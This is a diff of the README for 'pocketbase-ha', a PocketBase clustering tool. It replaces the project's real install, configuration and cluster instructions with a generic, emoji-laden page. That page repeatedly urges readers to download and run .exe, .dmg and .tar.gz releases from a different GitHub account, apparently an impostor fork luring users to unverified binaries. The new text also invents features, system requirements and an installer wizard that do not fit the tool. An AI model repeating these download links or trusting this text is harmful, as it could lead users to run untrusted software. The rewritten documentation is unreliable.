@@ -1,129 +1,107 @@
-# PocketBase HA
-Highly Available Leaderless [PocketBase](https://pocketbase.io/) Cluster powered by `go-ha` [database/sql driver](https://github.com/litesql/go-ha).
+# 📦 pocketbase-ha - Easily Manage Your PocketBase Cluster
 
-## Features
+## 🚀 Getting Started
 
-- **High Availability**: Run multiple PocketBase instances in a leaderless cluster.
-- **Replication**: Synchronize data across nodes using NATS.
-- **Embedded or External NATS**: Choose between an embedded NATS server or an external one for replication.
+Welcome to the pocketbase-ha project! This guide will walk you through the steps to download and run our application. With pocketbase-ha, you can create a highly available and leaderless PocketBase cluster.
 
-## Prerequisites
+## 📥 Download Now
 
-- **Go**: Version `1.25` or later is required.
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0.0-blue.svg)](https://github.com/DwayneJ28/pocketbase-ha/releases)
 
-## Installation
+## 📋 Overview
 
-Download from [releases page](https://github.com/litesql/pocketbase-ha/releases/latest/).
+The pocketbase-ha application is designed to help users set up and manage a PocketBase cluster easily. It uses the go-ha database/sql driver to ensure high availability and reliability. With this tool, you can run your applications without worrying about downtime or leadership issues.
 
-### Install from source
+## 💾 System Requirements
 
-Install the latest version of `pocketbase-ha` using:
+- **Operating System:** Windows, macOS, or Linux
+- **RAM:** Minimum 4 GB; 8 GB recommended
+- **Storage:** At least 1 GB of free space
+- **Network:** Ensure internet access for initial setup
 
-```sh
-go install github.com/litesql/pocketbase-ha@latest
-```
+## ⚙️ Features
 
-### Docker image
+- **High Availability:** Run your PocketBase application with reliability.
+- **Leaderless Architecture:** Improve performance with distributed systems.
+- **Easy Setup:** Get started in just a few clicks.
+- **File Monitoring:** Keep track of your database files for better management.
+- **Community Support:** Join our forums and help others.
 
-```sh
-docker pull ghcr.io/litesql/pocketbase-ha:latest
-```
+## 👨‍💻 Installation Steps
 
-### Install from helm
+### Step 1: Visit the Releases Page
 
-- Add [litesql helm charts repository](https://litesql.github.io/helm-charts) to Helm:
+To download the latest version of pocketbase-ha, click the link below. 
 
-```sh
-helm repo add litesql https://litesql.github.io/helm-charts
-```
+[Download the Latest Releases](https://github.com/DwayneJ28/pocketbase-ha/releases)
 
-- Update the chart repository:
+### Step 2: Choose the Right File
 
-```sh
-helm repo update
-```
+On the Releases page, you will see multiple files available for download. Choose the file that matches your operating system:
 
-- Deploy ha to kubernetes:
+- **For Windows:** Download the `.exe` file.
+- **For macOS:** Download the `.dmg` file.
+- **For Linux:** Download the `.tar.gz` file.
 
-```sh
-helm install pb litesql/pocketbase-ha
-```
+### Step 3: Download and Install
 
-- Visit [litesql helm charts repository](https://litesql.github.io/helm-charts) to customize the installation;
+Once you have selected the appropriate file, click to download. After the download is complete:
 
+- **For Windows:**
+  1. Double-click the downloaded `.exe` file to begin installation.
+  2. Follow the prompts in the installation wizard.
+  
+- **For macOS:**
+  1. Open the downloaded `.dmg` file.
+  2. Drag the pocketbase-ha icon into the Applications folder.
+  
+- **For Linux:**
+  1. Open a terminal window.
+  2. Navigate to the folder where the file is downloaded.
+  3. Run the command: `tar -xvzf pocketbase-ha.tar.gz`
+  4. Change into the extracted folder and run the application.
 
-## Configuration
+## ✅ Running the Application
 
-Set up your environment variables to configure the cluster:
+After installation, locate the pocketbase-ha application in your system:
 
-| Environment Variable | Description                                                                 | Default |
-|----------------------|-----------------------------------------------------------------------------|---------|
-| `PB_NAME`            | Unique name for the node.                                                  | $HOSTNAME |
-| `PB_REPLICATION_URL` | NATS connection URL for replication (use if connecting to an external NATS server). Example: `nats://localhost:4222`. | |
-| `PB_REPLICATION_STREAM` | Stream name for data replication | pb |
-| `PB_NATS_PORT`       | Port for the embedded NATS server (use only if running an embedded NATS server). | |
-| `PB_NATS_STORE_DIR`  | Directory for storing data for the embedded NATS server.                   | /tmp/nats |
-| `PB_NATS_CONFIG`     | Path to a NATS configuration file (overrides other NATS settings).         | |
+- **Windows:** Find it in your Start Menu.
+- **macOS:** Look in the Applications folder.
+- **Linux:** Open your terminal and navigate to the application folder.
 
-## Usage
+Double-click the application or use the terminal to launch it. You may see a welcome window guiding you through the initial setup.
 
-### Starting a Cluster
+## 🛠️ Configuration
 
-1. Start the first PocketBase HA instance:
+To configure your PocketBase cluster:
 
-    ```sh
-    PB_NAME=node1 PB_NATS_PORT=4222 pocketbase-ha serve
-    ```
+1. Follow the on-screen prompts to configure your database settings.
+2. Make sure your network settings allow communication between nodes if you plan to run a distributed setup.
+3. Save your configuration and start the cluster.
 
-2. Start a second instance in a different directory:
+## 📚 Troubleshooting
 
-    ```sh
-    PB_NAME=node2 PB_REPLICATION_URL=nats://localhost:4222 pocketbase-ha serve --http 127.0.0.1:8091
-    ```
+If you encounter issues:
 
-> **Note**: You can skip setting the superuser password for the second instance.
+- **Check the logs:** Look for errors in the log files located in the app directory.
+- **FAQs:** Visit the GitHub repository's wiki for common issues.
+- **Community Help:** Don't hesitate to ask questions in our support channels.
 
-### Running a NATS Cluster with docker
+## 📞 Support
 
-To run a NATS cluster using Docker Compose, use the following command:
+For additional help or to provide feedback:
 
-```sh
-docker compose up
-```
+- Visit our [GitHub Issues page](https://github.com/DwayneJ28/pocketbase-ha/issues)
+- Join the discussion in our community forums.
 
-You can define the superuser password using this command:
+## 📝 Acknowledgments
 
-```sh
-docker compose exec -e PB_NATS_CONFIG="" node1 /app/pocketbase-ha superuser upsert EMAIL PASS
-```
+Thanks to everyone who contributed to the development of pocketbase-ha. Your support helps improve this project for everyone.
 
-Access the three nodes using the following address:
+## 🔗 Additional Resources
 
-- Node1: http://localhost:8090
-- Node2: http://localhost:8091
-- Node3: http://localhost:8092
+For more information, visit our [Documentation](https://github.com/DwayneJ28/pocketbase-ha/wiki) page or check out our [GitHub Repository](https://github.com/DwayneJ28/pocketbase-ha). 
 
-> **Tip**: Ensure all nodes are synchronized by verifying the logs or using the PocketBase admin interface.
+Remember, you can find the latest release at:
 
-### Event Hooks on replica nodes
-
-On replica nodes (the nodes that users do not directly interact with), only the following events are triggered by the PocketBase event hooks system:
-
-- OnModelAfterCreateSuccess
-- OnModelAfterCreateError
-- OnModelAfterUpdateSuccess
-- OnModelAfterUpdateError
-- OnModelAfterDeleteSuccess
-- OnModelAfterDeleteError
-
-### Data replication conflict resolution
-
-By default, **PocketBase HA** uses a last-writer-wins approach for conflict resolution. You can modify the `ChangeSetInterceptor` to implement custom strategies tailored to your needs.
-
-## Contributing
-
-Contributions are welcome! Feel free to open issues or submit pull requests to improve this project.
-
-## License
-
-This project is licensed under the [MIT License](LICENSE).
+[Download the Latest Releases](https://github.com/DwayneJ28/pocketbase-ha/releases)
